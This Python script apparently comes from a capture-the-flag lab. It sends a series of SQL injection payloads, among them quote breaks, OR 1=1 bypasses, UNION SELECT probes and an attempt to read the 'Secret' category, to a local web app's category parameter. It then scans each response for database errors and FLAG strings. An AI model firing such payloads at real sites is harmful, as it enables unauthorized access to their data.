import requests
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32860/"

def test_sqli(payload, description):
    """Test SQL injection payload and return key findings"""
    url = f"{BASE_URL}?category={quote(payload)}"
    
    try:
        response = requests.get(url, timeout=10)
        
        # Check for SQL errors
        sql_error_patterns = [
            r"SQL syntax", r"mysql_fetch", r"SQLite", r"PostgreSQL",
            r"syntax error", r"SQLSTATE", r"sqlite3\.", r"DatabaseError"
        ]
        
        has_sql_error = False
        for pattern in sql_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                has_sql_error = True
                break
        
        # Count posts
        post_count = response.text.count('<article') + response.text.count('<div class="post')
        
        # Check for Secret mentions
        secret_count = len(re.findall(r'(?i)secret', response.text))
        
        # Check for FLAGS
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Print summary
        print(f"\n[{description}]")
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code} | Length: {len(response.content)}B | Posts: {post_count}")
        
        if has_sql_error:
            print(f"[!] SQL ERROR DETECTED")
        
        if secret_count > 0:
            print(f"[!] 'Secret' found {secret_count} times")
        
        if flags:
            print(f"[!] FLAG FOUND: {flags}")
            print(f"\n[FULL RESPONSE WITH FLAG]")
            print(response.text)
        
        return {
            'status': response.status_code,
            'length': len(response.content),
            'posts': post_count,
            'sql_error': has_sql_error,
            'secret_count': secret_count,
            'flags': flags,
            'response': response.text
        }
        
    except Exception as e:
        print(f"[{description}] ERROR: {e}")
        return None

# Baseline test
print("="*80)
print("SQL INJECTION TESTING")
print("="*80)

baseline = test_sqli("Technology", "BASELINE - Normal category")

# Core SQLi tests
test_sqli("'", "TEST 1 - Single quote")
test_sqli("' OR '1'='1", "TEST 2 - OR-based bypass")
test_sqli("' OR '1'='1'--", "TEST 3 - OR with comment")
test_sqli("' OR 1=1--", "TEST 4 - OR 1=1")
test_sqli("' UNION SELECT NULL--", "TEST 5 - UNION NULL")
test_sqli("' UNION SELECT NULL,NULL,NULL--", "TEST 6 - UNION 3 columns")
test_sqli("Secret' OR '1'='1", "TEST 7 - Secret with OR bypass")
test_sqli("Secret'--", "TEST 8 - Secret with comment")
test_sqli("' OR category='Secret'--", "TEST 9 - Direct Secret access")
test_sqli('" OR "1"="1', "TEST 10 - Double quote OR")

print("\n" + "="*80)
print("TESTING COMPLETE")
print("="*80)

